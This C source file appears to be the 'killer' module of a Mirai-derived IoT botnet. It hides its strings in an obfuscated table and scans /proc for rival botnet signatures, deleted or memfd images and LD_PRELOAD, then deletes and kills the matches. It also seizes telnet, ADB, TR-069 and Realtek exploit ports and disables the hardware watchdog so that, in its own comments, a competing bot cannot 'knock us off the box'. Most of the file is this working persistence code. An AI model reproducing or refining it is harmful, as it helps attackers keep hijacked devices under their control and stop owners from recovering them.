#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/limits.h>
#include <linux/watchdog.h>
#include <time.h>
#include <sys/syscall.h>
#include <errno.h>

/* pidfd syscalls: glibc may not expose wrappers on older toolchains. */
#ifndef __NR_pidfd_open
#define __NR_pidfd_open 434
#endif
#ifndef __NR_pidfd_send_signal
#define __NR_pidfd_send_signal 424
#endif
static inline int sys_pidfd_open(pid_t pid)              { return syscall(__NR_pidfd_open, pid, 0); }
static inline int sys_pidfd_send_signal(int pfd, int sig){ return syscall(__NR_pidfd_send_signal, pfd, sig, NULL, 0); }
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

/* Scan cadence — droppers land and reconnect fast; keep this tight. */
#define KILLER_SCAN_INTERVAL 5

int killer_pid;

/* Kill-cooldown ring: djb2(exe_path) → last-kill timestamp. A misclassified
 * daemon that init respawns would otherwise be killed every scan cycle; this
 * caps re-kills of the same exe to once per KILLER_KILL_COOLDOWN seconds. */
#define KILL_RING_SZ 16
#define KILLER_KILL_COOLDOWN 60
static struct { uint32_t h; long ts; } kill_ring[KILL_RING_SZ];

static uint32_t djb2(const char *s, int n)
{
    uint32_t h = 5381;
    while (n-- > 0) h = ((h << 5) + h) ^ (uint8_t)*s++;
    return h;
}

static BOOL kill_cooldown_check_and_stamp(const char *path, int len);

BOOL killer_kill_cooldown(const char *path, int len)
{
    return kill_cooldown_check_and_stamp(path, len);
}

/* Returns TRUE if the ring already has this path within cooldown → skip kill. */
static BOOL kill_cooldown_check_and_stamp(const char *path, int len)
{
    uint32_t h = djb2(path, len);
    long now = (long)time(NULL);
    int i, oldest = 0;
    long oldest_ts = kill_ring[0].ts;
    for (i = 0; i < KILL_RING_SZ; i++) {
        if (kill_ring[i].h == h && now - kill_ring[i].ts < KILLER_KILL_COOLDOWN)
            return TRUE;
        if (kill_ring[i].ts < oldest_ts) { oldest_ts = kill_ring[i].ts; oldest = i; }
    }
    kill_ring[oldest].h = h;
    kill_ring[oldest].ts = now;
    return FALSE;
}

/* Cached at killer_prepare_scan(); reused by every killer_scan_once() caller
 * (killer's own loop AND locker's fallback / safety-net sweeps). */
static char g_own_path[PATH_MAX];
static int  g_own_len = 0;
static BOOL g_prepared = FALSE;

/* Format port number as 4-digit uppercase hex (as seen in /proc/net/tcp). */
static void port_to_hex4(uint16_t n, char out[5])
{
    const char hex[] = "0123456789ABCDEF";
    out[0] = hex[(n >> 12) & 0xF];
    out[1] = hex[(n >>  8) & 0xF];
    out[2] = hex[(n >>  4) & 0xF];
    out[3] = hex[ n        & 0xF];
    out[4] = 0;
}

static char *skip_ws(char *p)
{
    while (*p == ' ' || *p == '\t') p++;
    return p;
}

static char *skip_tok(char *p)
{
    p = skip_ws(p);
    while (*p && *p != ' ' && *p != '\t' && *p != '\n' && *p != '\r') p++;
    return p;
}

/*
 * Parse /proc/net/tcp for a LISTEN (state 0A) entry on `port` (host order).
 * Copies the decimal inode number into inode_out (must be >= 16 bytes).
 * Returns 0 on success, -1 if not found.
 *
 * /proc/net/tcp line format after the "N:" slot prefix:
 *   local_addr rem_addr state tx:rx tr:when retrnsmt uid timeout inode ...
 * Fields are 1-indexed; inode is field 9.
 */
static int find_listen_inode(uint16_t port, char *inode_out)
{
    char buf[512], port4[5];
    int fd, i;

    port_to_hex4(port, port4);

    table_unlock_val(TABLE_KILLER_TCP);
    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    table_lock_val(TABLE_KILLER_TCP);
    if (fd == -1) return -1;

    while (util_fdgets(buf, sizeof(buf) - 1, fd) != NULL) {
        char *p = buf, *local, *colon, *inode_start;

        /* skip "  N:" slot prefix */
        while (*p && *p != ':') p++;
        if (!*p) continue;
        p++;

        /* field 1: "XXXXXXXX:PPPP" */
        p = skip_ws(p);
        local = p;
        while (*p && *p != ' ' && *p != '\t') p++;
        if (!*p) continue;
        *p++ = 0;

        /* locate port portion after ':' in the local address */
        colon = local;
        while (*colon && *colon != ':') colon++;
        if (!*colon || util_strlen(colon + 1) < 4) continue;
        colon++;

        /* case-insensitive 4-char hex port compare */
        if (((colon[0] | 0x20) != (port4[0] | 0x20)) ||
            ((colon[1] | 0x20) != (port4[1] | 0x20)) ||
            ((colon[2] | 0x20) != (port4[2] | 0x20)) ||
            ((colon[3] | 0x20) != (port4[3] | 0x20)))
            continue;

        /* field 2: rem_address — skip */
        p = skip_tok(p);

        /* field 3: state must be "0A" (TCP_LISTEN) */
        p = skip_ws(p);
        if (p[0] != '0' || (p[1] != 'A' && p[1] != 'a')) continue;
        p = skip_tok(p);

        /* fields 4-8: tx_queue, tr, retrnsmt, uid, timeout — skip */
        for (i = 0; i < 5; i++) p = skip_tok(p);

        /* field 9: inode */
        p = skip_ws(p);
        inode_start = p;
        while (*p && *p != ' ' && *p != '\t' && *p != '\n' && *p != '\r') p++;
        *p = 0;

        if (!*inode_start || *inode_start == '0') continue;

        util_strcpy(inode_out, inode_start);
        close(fd);
        return 0;
    }

    close(fd);
    return -1;
}

/*
 * Kill every process that owns a file descriptor pointing to socket:[inode_s].
 * Skips pid 1 and own_pid.
 *
 * Uses exact string match ("socket:[N]") so "123" does not match "socket:[1234]".
 */
static void kill_inode_owner(const char *inode_s, int own_pid)
{
    char target[64], *tp = target;
    DIR *proc_dir, *fd_dir;
    struct dirent *pe, *fe;

    /* build "socket:[NNNNN]" */
    tp += util_strcpy(tp, "socket:[");
    tp += util_strcpy(tp, inode_s);
    *tp++ = ']';
    *tp = 0;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_FD);

    proc_dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));
    if (!proc_dir) {
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_FD);
        return;
    }

    while ((pe = readdir(proc_dir)) != NULL) {
        char fdpath[PATH_MAX], lnkpath[PATH_MAX], lnk[PATH_MAX];
        char *ptr;
        int pid, rlen;

        if (pe->d_name[0] < '1' || pe->d_name[0] > '9') continue;
        pid = atoi(pe->d_name);
        if (pid == 1 || pid == own_pid) continue;

        /* /proc/PID/fd */
        ptr = fdpath;
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
        ptr += util_strcpy(ptr, pe->d_name);
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_FD, NULL));

        fd_dir = opendir(fdpath);
        if (!fd_dir) continue;

        while ((fe = readdir(fd_dir)) != NULL) {
            if (fe->d_name[0] == '.') continue;

            /* /proc/PID/fd/N */
            ptr = lnkpath;
            ptr += util_strcpy(ptr, fdpath);
            *ptr++ = '/';
            *ptr = 0;
            ptr += util_strcpy(ptr, fe->d_name);

            rlen = readlink(lnkpath, lnk, sizeof(lnk) - 1);
            if (rlen <= 0) continue;
            lnk[rlen] = 0;

            if (util_strcmp(lnk, target)) {
                kill(pid, 9);
                break;
            }
        }
        closedir(fd_dir);
    }

    closedir(proc_dir);
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_FD);
}

/*
 * Kill all processes listening on port_net (network byte order).
 * Uses exact inode matching — safe to call without false kills.
 */
BOOL killer_kill_by_port(port_t port_net)
{
    char inode_s[32] = {0};
    if (find_listen_inode(ntohs(port_net), inode_s) != 0) return FALSE;
    kill_inode_owner(inode_s, getpid());
    return TRUE;
}

/* Return TRUE if path belongs to a system directory that must not be killed. */
static BOOL is_system_path(const char *path, int len)
{
    return util_stristr(path, len, "/usr/lib/")    != -1 ||
           util_stristr(path, len, "/lib/systemd") != -1 ||
           util_stristr(path, len, "/usr/sbin/")   != -1 ||
           util_stristr(path, len, "/usr/bin/")    != -1 ||
           util_stristr(path, len, "/usr/local/")  != -1 ||
           util_stristr(path, len, "/sbin/")        != -1 ||
           util_stristr(path, len, "/bin/")         != -1;
}

/*
 * Return TRUE if exe path contains a well-known IoT malware family name.
 * Only specific, verified botnet families — no short or generic strings.
 */
/* Signature table used for both exe-path AND in-memory (/proc/PID/{maps,cmdline})
 * matching. Same string set catches the string whether it lives in the file name
 * or in .rodata of an unlinked binary. */
static const uint8_t g_hunt_ids[] = {
    TABLE_KILLER_ANIME,    TABLE_MEM_GAFGYT,      TABLE_MEM_SATORI,
    TABLE_MEM_HAJIME,      TABLE_MEM_MOZI,        TABLE_MEM_BASHLITE,
    TABLE_MEM_TSUNAMI,     TABLE_MEM_MUHSTIK,     TABLE_MEM_XORDDOS,
    TABLE_MEM_KATANA,      TABLE_MEM_PINKBOT,     TABLE_MEM_LIGHTAIDRA,
    TABLE_MEM_CONDI,       TABLE_MEM_KIRAZ,       TABLE_MEM_HTTP_BROWSER,
    TABLE_MEM_SORA_BINARY, TABLE_MEM_TMP_WLANCONT,TABLE_MEM_TMP_JNO,
    TABLE_MEM_MIRAI,       TABLE_MEM_SORA1,       TABLE_MEM_SORA2,       TABLE_MEM_SORA3,
    TABLE_MEM_OWARI,       TABLE_MEM_OWARI2,      TABLE_MEM_JOSHO,       TABLE_MEM_JOSHO4,
    TABLE_MEM_JOSHO5,      TABLE_MEM_APOLLO,      TABLE_MEM_MASUTA,      TABLE_MEM_VAMP,
    TABLE_MEM_QBOT1,       TABLE_MEM_QBOT2,       TABLE_MEM_OMNI,        TABLE_MEM_SHINTO,
    TABLE_MEM_HAKAI,       TABLE_MEM_ATERNA,      TABLE_MEM_ZOLLARD,     TABLE_MEM_REMAITEN,
    TABLE_MEM_JOKER,       TABLE_MEM_COSMIC,      TABLE_MEM_MANJI,       TABLE_MEM_STAR,
    TABLE_MEM_SNOOPY,      TABLE_MEM_EAGLEWARE,   TABLE_MEM_DEBUGBOT,    TABLE_MEM_INDIA,
    TABLE_MEM_MAYDAY,      TABLE_MEM_SAKURA,      TABLE_MEM_MORTE,       TABLE_MEM_ASTRO,
    TABLE_MEM_BOTNET_AIO,  TABLE_MEM_INDIATECH,   TABLE_MEM_APEX,        TABLE_MEM_QTX,
};
#define HUNT_IDS_LEN ((int)(sizeof(g_hunt_ids) / sizeof(g_hunt_ids[0])))

/* ---------------- Aho-Corasick multi-pattern matcher ----------------
 * Replaces the O(N*M) linear scan (50+ patterns × per-byte substring check)
 * with an O(N + M) automaton built once at init. On a box with 200 processes
 * this drops per-sweep pattern work from ~10k stristr calls to a single
 * left-to-right pass over each cmdline/maps buffer.
 *
 * Compact representation: children as a small edge array per node (patterns
 * are short ASCII substrings, so branching is narrow — 16 slots is plenty).
 * All matching is case-folded to lowercase, matching the util_stristr
 * semantics the old code used. */
#define AC_MAX_NODES     512
#define AC_MAX_CHILDREN  16

typedef struct { uint8_t c; uint16_t next; } ac_edge_t;
typedef struct {
    ac_edge_t edges[AC_MAX_CHILDREN];
    uint8_t   nedges;
    uint8_t   terminal;   /* 1 → some pattern ends here (or in fail chain) */
    uint16_t  fail;
} ac_node_t;

static ac_node_t ac_nodes[AC_MAX_NODES];
static int       ac_node_count = 1;   /* node 0 = root */
static BOOL      ac_built      = FALSE;

static uint16_t ac_child(uint16_t n, uint8_t c)
{
    int i;
    for (i = 0; i < ac_nodes[n].nedges; i++)
        if (ac_nodes[n].edges[i].c == c) return ac_nodes[n].edges[i].next;
    return 0;
}

static uint16_t ac_add_child(uint16_t n, uint8_t c)
{
    uint16_t ch = ac_child(n, c);
    if (ch) return ch;
    if (ac_node_count >= AC_MAX_NODES) return 0;
    if (ac_nodes[n].nedges >= AC_MAX_CHILDREN) return 0;
    ch = ac_node_count++;
    ac_nodes[n].edges[ac_nodes[n].nedges].c    = c;
    ac_nodes[n].edges[ac_nodes[n].nedges].next = ch;
    ac_nodes[n].nedges++;
    return ch;
}

static void ac_add_pattern(const char *s, int len)
{
    uint16_t n = 0;
    int i;
    for (i = 0; i < len; i++) {
        uint8_t c = (uint8_t)s[i];
        if (c >= 'A' && c <= 'Z') c |= 0x20;  /* fold to lower */
        n = ac_add_child(n, c);
        if (!n) return;   /* out of space — pattern silently dropped */
    }
    ac_nodes[n].terminal = 1;
}

/* BFS fail-link construction. After this, ac_search runs in O(N). */
static void ac_build_fail(void)
{
    static uint16_t queue[AC_MAX_NODES];
    int qh = 0, qt = 0, i;

    for (i = 0; i < ac_nodes[0].nedges; i++) {
        uint16_t child = ac_nodes[0].edges[i].next;
        ac_nodes[child].fail = 0;
        queue[qt++] = child;
    }
    while (qh < qt) {
        uint16_t u = queue[qh++];
        for (i = 0; i < ac_nodes[u].nedges; i++) {
            uint8_t  c = ac_nodes[u].edges[i].c;
            uint16_t v = ac_nodes[u].edges[i].next;
            uint16_t f = ac_nodes[u].fail;
            uint16_t fc;
            while (f != 0 && !ac_child(f, c)) f = ac_nodes[f].fail;
            fc = ac_child(f, c);
            ac_nodes[v].fail = (fc && fc != v) ? fc : 0;
            /* Propagate terminal through the fail chain so a single flag
             * check in the search loop suffices. */
            if (ac_nodes[ac_nodes[v].fail].terminal) ac_nodes[v].terminal = 1;
            if (qt < AC_MAX_NODES) queue[qt++] = v;
        }
    }
}

/* Called once from killer_prepare_scan(). Unlocks each hunted pattern,
 * inserts into the trie, re-locks. */
static void ac_build(void)
{
    int i;
    if (ac_built) return;
    for (i = 0; i < HUNT_IDS_LEN; i++) {
        table_unlock_val(g_hunt_ids[i]);
        const char *pat = table_retrieve_val(g_hunt_ids[i], NULL);
        int plen = 0;
        while (pat[plen]) plen++;
        ac_add_pattern(pat, plen);
        table_lock_val(g_hunt_ids[i]);
    }
    ac_build_fail();
    ac_built = TRUE;
}

static BOOL ac_search(const char *buf, int len)
{
    uint16_t n = 0;
    int i;
    for (i = 0; i < len; i++) {
        uint8_t c = (uint8_t)buf[i];
        if (c >= 'A' && c <= 'Z') c |= 0x20;
        while (n != 0 && !ac_child(n, c)) n = ac_nodes[n].fail;
        n = ac_child(n, c);
        if (ac_nodes[n].terminal) return TRUE;
    }
    return FALSE;
}

static BOOL buf_matches_any(const char *buf, int len)
{
    /* Automaton is built lazily on the first call from killer_prepare_scan.
     * If build hasn't happened yet (defensive), fall back to the linear
     * scan so detection still works. */
    if (ac_built) return ac_search(buf, len);

    int i;
    for (i = 0; i < HUNT_IDS_LEN; i++) {
        BOOL found;
        table_unlock_val(g_hunt_ids[i]);
        found = util_stristr(buf, len, table_retrieve_val(g_hunt_ids[i], NULL)) != -1;
        table_lock_val(g_hunt_ids[i]);
        if (found) return TRUE;
    }
    return FALSE;
}

static BOOL is_malware_exe(const char *path, int len)
{
    return buf_matches_any(path, len);
}

/* Read up to cap bytes from a /proc file into buf. Returns bytes read (0 on error). */
static int slurp_file(const char *path, char *buf, int cap)
{
    int fd = open(path, O_RDONLY), total = 0, n;
    if (fd < 0) return 0;
    while (total < cap - 1) {
        n = read(fd, buf + total, cap - 1 - total);
        if (n <= 0) break;
        total += n;
    }
    close(fd);
    buf[total] = 0;
    return total;
}

/* Scan /proc/PID/{cmdline,maps} for any hunted signature. Cheap early-exit. */
static BOOL proc_mem_matches(const char *proc_root, const char *pid_str)
{
    char path[PATH_MAX], *ptr;
    /* Stack-allocated: reentrant, and 8KB is trivial against Linux's default
     * 8MB stack. Previous `static` version was a latent footgun if the
     * scanner ever moved off a single-thread-per-process model. */
    char buf[8192];
    int n, i;

    /* /proc/PID/cmdline */
    ptr = path;
    ptr += util_strcpy(ptr, proc_root);
    ptr += util_strcpy(ptr, pid_str);
    util_strcpy(ptr, "/cmdline");
    n = slurp_file(path, buf, sizeof(buf));
    /* NUL-separated args — flip to spaces so stristr scans across them */
    for (i = 0; i < n; i++) if (buf[i] == 0) buf[i] = ' ';
    if (n > 0 && buf_matches_any(buf, n)) return TRUE;

    /* /proc/PID/maps — first 8KB is enough to see all mapped exe/lib names */
    ptr = path;
    ptr += util_strcpy(ptr, proc_root);
    ptr += util_strcpy(ptr, pid_str);
    util_strcpy(ptr, "/maps");
    n = slurp_file(path, buf, sizeof(buf));
    if (n > 0 && buf_matches_any(buf, n)) return TRUE;

    return FALSE;
}

/* Trim trailing " (deleted)" from readlink() output; return possibly-shortened length. */
static int strip_deleted_suffix(char *path, int len)
{
    static const char sfx[] = " (deleted)";
    int sl = (int)sizeof(sfx) - 1;
    if (len > sl && util_strcmp(path + len - sl, sfx)) {
        path[len - sl] = 0;
        return len - sl;
    }
    return len;
}

/* Return TRUE if the resolved exe path is an in-memory image the kernel presents
 * with a synthetic name — memfd_create(), /dev/shm, /tmp anonymous copies. These
 * are how modern droppers (Mirai forks, Cetus, XorDDoS-newer) launch without ever
 * touching a persistent path — signature match on the file alone would miss them. */
static BOOL is_ephemeral_image(const char *path, int len)
{
    /* /proc/PID/exe → "/memfd:<name> (deleted)" for memfd_create+fexecve */
    if (len >= 7  && util_stristr(path, len, "/memfd:")  != -1) return TRUE;
    if (len >= 9  && util_stristr(path, len, "/dev/shm/") != -1) return TRUE;
    if (len >= 8  && util_stristr(path, len, "/dev/fd/")  != -1) return TRUE;
    return FALSE;
}

/* Read /proc/PID/environ and return TRUE if LD_PRELOAD is set to anything.
 * Legitimate daemons on IoT devices essentially never use it. */
static BOOL proc_has_ld_preload(const char *proc_root, const char *pid_str)
{
    char path[PATH_MAX], *ptr;
    char buf[4096];   /* stack: reentrant */
    int fd, n, i;

    ptr = path;
    ptr += util_strcpy(ptr, proc_root);
    ptr += util_strcpy(ptr, pid_str);
    util_strcpy(ptr, "/environ");
    fd = open(path, O_RDONLY);
    if (fd < 0) return FALSE;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return FALSE;
    /* environ is NUL-separated KEY=VAL pairs — scan each */
    for (i = 0; i < n; ) {
        int start = i;
        while (i < n && buf[i] != 0) i++;
        if (i - start > 11 &&
            (buf[start] == 'L' || buf[start] == 'l') &&
            (buf[start+1] == 'D' || buf[start+1] == 'd') &&
            buf[start+2] == '_' &&
            util_stristr(buf + start, i - start, "LD_PRELOAD=") != -1)
            return TRUE;
        i++;
    }
    return FALSE;
}

/* TOCTOU-safe kill: acquires a pidfd BEFORE the exe/mem checks so a recycled
 * PID can't slip through between readlink and kill. Caller opens the pidfd
 * up-front and passes it here; we send SIGKILL via pidfd_send_signal (which
 * refuses on recycled pids). Falls back to raw kill() on kernels without
 * pidfd support — no worse than before. */
static void safe_kill(int pfd, pid_t pid)
{
    if (pfd >= 0) {
        if (sys_pidfd_send_signal(pfd, SIGKILL) == 0) return;
        /* ESRCH here means the pid died before we signalled — safe outcome. */
        if (errno == ESRCH) return;
    }
    kill(pid, 9);
}

/* Held watchdog fds so we can pet them periodically as a robustness fallback
 * — some SoC drivers ignore WDIOS_DISABLECARD and the 'V' magic-close, and
 * their timer will fire unless we keep the watchdog fed. */
#define WD_MAX 4
static int wd_fds[WD_MAX];
static int wd_count = 0;

static void watchdog_keepalive_tick(void)
{
    int i, dummy = 0;
    for (i = 0; i < wd_count; i++)
        if (wd_fds[i] >= 0) ioctl(wd_fds[i], WDIOC_KEEPALIVE, &dummy);
}

/* Seal the hardware watchdog so a competing bot can't schedule a reboot to
 * knock us off the box. Mirai's watchdog trick: open /dev/watchdog and never
 * write to it — the driver reboots after ~60s. WDIOS_DISABLECARD tells the
 * driver to stop the timer entirely; the fd is intentionally leaked so no
 * later process can reopen and re-arm it. */
static void seal_watchdog(void)
{
    static const char *paths[] = { "/dev/watchdog", "/dev/watchdog0", "/dev/misc/watchdog" };
    int i, fd, flag = WDIOS_DISABLECARD;
    for (i = 0; i < 3; i++) {
        fd = open(paths[i], O_RDWR);
        if (fd < 0) continue;
        /* Best-effort: not every driver honours SETOPTIONS. The 'V' magic-close
         * write below is the portable stop signal — the kernel treats a single
         * 'V' byte as "user requested clean shutdown, do not reboot". */
        ioctl(fd, WDIOC_SETOPTIONS, &flag);
        write(fd, "V", 1);
        /* Remember the fd so the main loop can WDIOC_KEEPALIVE it — some
         * SoC drivers silently ignore both SETOPTIONS and 'V' and require
         * a continuous heartbeat to stay disarmed. fd leaked on purpose. */
        if (wd_count < WD_MAX) wd_fds[wd_count++] = fd;
    }
}

/* Bind :port on IPv6 with V6ONLY=off so both stacks are covered in one fd —
 * a dropper hitting [::]:23 on a dual-stack box gets EADDRINUSE. Silently
 * skipped on IPv4-only kernels. */
static void hold_port_v6(uint16_t port)
{
    struct sockaddr_in6 a6;
    int tfd, opt = 1, off = 0;
    if ((tfd = socket(AF_INET6, SOCK_STREAM, 0)) == -1) return;
    setsockopt(tfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(tfd, IPPROTO_IPV6, IPV6_V6ONLY, &off, sizeof(off));
    util_zero(&a6, sizeof(a6));
    a6.sin6_family = AF_INET6;
    a6.sin6_port = htons(port);
    /* in6addr_any == :: — kernel maps this to accept both v4 & v6. */
    if (bind(tfd, (struct sockaddr *)&a6, sizeof(a6)) < 0) { close(tfd); return; }
    listen(tfd, 1);
    /* fd leaked on purpose (must remain bound). */
}

/* Bind :port, killing whoever holds it first. fd leaked intentionally — the socket
 * must stay bound for our whole lifetime to block re-infection via that vector. */
static void hold_port(uint16_t port)
{
    struct sockaddr_in a;
    int tfd, opt = 1;
    killer_kill_by_port(htons(port));
    util_zero(&a, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = INADDR_ANY;
    a.sin_port = htons(port);
    if ((tfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
    setsockopt(tfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    if (bind(tfd, (struct sockaddr *)&a, sizeof(a)) < 0) { close(tfd); return; }
    listen(tfd, 1);
}

/* Cache own exe path + seal watchdog + hold reinfection ports. Idempotent —
 * safe to call from both killer_init() and locker (which also calls
 * killer_scan_once() and needs the cache populated). */
void killer_prepare_scan(void)
{
    if (g_prepared) return;
    g_prepared = TRUE;

    /* Compile the pattern set into an Aho-Corasick automaton — once. */
    ac_build();

    table_unlock_val(TABLE_PATH_PROC_SELF_EXE);
    g_own_len = readlink(table_retrieve_val(TABLE_PATH_PROC_SELF_EXE, NULL),
                         g_own_path, PATH_MAX - 1);
    table_lock_val(TABLE_PATH_PROC_SELF_EXE);
    if (g_own_len > 0) g_own_path[g_own_len] = 0;
    else { g_own_len = 0; g_own_path[0] = 0; }
}

/* Walk /proc once, killing anything that fires ANY detector. Callable by
 * killer's main loop and by locker's netlink-fallback / safety-net sweeps —
 * single source of truth for malware detection. */
void killer_scan_once(void)
{
    DIR *dir;
    struct dirent *e;

    if (!g_prepared) killer_prepare_scan();

    table_unlock_val(TABLE_KILLER_PROC);
    dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    if (!dir) return;

    while ((e = readdir(dir)) != NULL) {
        char exepath[PATH_MAX], rpath[PATH_MAX], *ptr;
        int rplen, pid;

        if (e->d_name[0] < '1' || e->d_name[0] > '9') continue;
        pid = atoi(e->d_name);
        if (pid == 1 || pid == getpid() || pid == getppid()) continue;

        table_unlock_val(TABLE_KILLER_PROC);
        table_unlock_val(TABLE_KILLER_EXE);
        ptr = exepath;
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
        ptr += util_strcpy(ptr, e->d_name);
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_EXE, NULL));
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);

        rplen = readlink(exepath, rpath, sizeof(rpath) - 1);
        if (rplen <= 0) continue;
        rpath[rplen] = 0;

        BOOL deleted = FALSE;
        {
            int stripped = strip_deleted_suffix(rpath, rplen);
            if (stripped != rplen) { deleted = TRUE; rplen = stripped; }
        }

        if (g_own_len > 0 && util_strcmp(rpath, g_own_path)) continue;
        if (is_system_path(rpath, rplen)) continue;

        table_unlock_val(TABLE_KILLER_PROC);
        const char *proc_root = table_retrieve_val(TABLE_KILLER_PROC, NULL);
        BOOL hit = is_malware_exe(rpath, rplen) ||
                   proc_mem_matches(proc_root, e->d_name) ||
                   deleted ||
                   is_ephemeral_image(rpath, rplen) ||
                   proc_has_ld_preload(proc_root, e->d_name);
        table_lock_val(TABLE_KILLER_PROC);

        if (!hit) continue;

        /* Cooldown: same exe (by path hash) at most once per KILLER_KILL_COOLDOWN
         * seconds. Blocks respawn-storms on a misclassified daemon. */
        if (kill_cooldown_check_and_stamp(rpath, rplen)) continue;

        /* TOCTOU guard: open a pidfd against THIS pid; if it was recycled
         * between readlink and now, pidfd_send_signal will refuse. */
        int pfd = sys_pidfd_open(pid);
        if (!deleted && !is_ephemeral_image(rpath, rplen)) unlink(rpath);
        safe_kill(pfd, pid);
        if (pfd >= 0) close(pfd);
    }
    closedir(dir);
}

void killer_init(void)
{
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    /* Close inherited fd_ctrl so it doesn't block single-instance restarts */
    extern int fd_ctrl;
    if (fd_ctrl != -1) { close(fd_ctrl); fd_ctrl = -1; }

    sleep(5);

    killer_prepare_scan();

    /* Hold classic re-infection ports so droppers can't reuse the same vector.
     *   23    telnet (Mirai/Hakai/Gafgyt)
     *   2323  telnet alt (Mirai)
     *   5555  Android Debug Bridge (ADB.Miner, Fbot)
     *   7547  CWMP/TR-069 (Mirai Deutsche Telekom variant)
     *   37215 Realtek SDK RCE (Satori)
     *   52869 Realtek Miniigd UPnP (Satori, Hakai)  */
    /* Bind IPv4 and IPv6 for each — dual-stack boxes let a dropper reach the
     * port via [::]:N otherwise. */
    static const uint16_t reinf_ports[] = {23, 2323, 5555, 7547, 37215, 52869};
    unsigned pi;
    for (pi = 0; pi < sizeof(reinf_ports)/sizeof(reinf_ports[0]); pi++) {
        hold_port(reinf_ports[pi]);
        hold_port_v6(reinf_ports[pi]);
    }

    seal_watchdog();

    while (1) {
        killer_scan_once();
        watchdog_keepalive_tick();
        sleep(KILLER_SCAN_INTERVAL);
    }
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}
